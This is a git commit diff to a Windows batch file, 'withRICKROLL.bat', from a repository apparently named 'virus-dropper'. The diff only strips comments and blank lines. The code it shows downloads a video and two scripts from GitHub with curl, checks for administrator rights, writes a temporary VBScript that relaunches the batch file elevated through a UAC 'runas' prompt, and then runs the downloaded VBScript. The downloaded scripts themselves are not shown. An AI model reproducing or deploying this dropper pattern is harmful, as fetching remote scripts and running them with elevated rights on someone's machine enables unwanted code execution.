18f993d683a11c03b884126284e5366efa1e990b
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-04 20:02:06 -0400

    Update withRICKROLL.bat

--- withRICKROLL.bat
+++ withRICKROLL.bat
@@ -2,21 +2,14 @@
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.vbs" --output "rickroll.vbs"
-:: BatchGotAdmin
-::-------------------------------------
-REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     goto UACPrompt
 ) else ( goto gotAdmin )
-
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     set params = %*:"="
     echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
     wscript rickroll.vbs
